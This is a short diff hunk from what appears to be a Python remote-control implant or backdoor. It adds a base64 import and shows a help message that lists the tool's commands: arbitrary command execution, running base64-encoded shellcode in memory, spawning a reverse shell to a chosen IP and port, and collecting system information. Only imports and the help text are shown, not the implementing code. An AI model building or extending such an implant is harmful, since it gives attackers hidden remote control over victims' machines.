@@ -14,10 +14,11 @@ import socket
 import subprocess
 import urllib2
 import re
+import base64
 
 help_message = """
 Available commands are:
-/command <argument> - executes an arbitrary command 
+/command <argument> - executes an arbitrary command
 /shellcode <argument> - receives a base64'd shellcode and executes it in memory
 /reverseshell <ip> <port> - spawns a connect-back shell to a specified IP and port
 /sysinfo - returns system information (e.g., 'uname -a', public IP address, etc.)
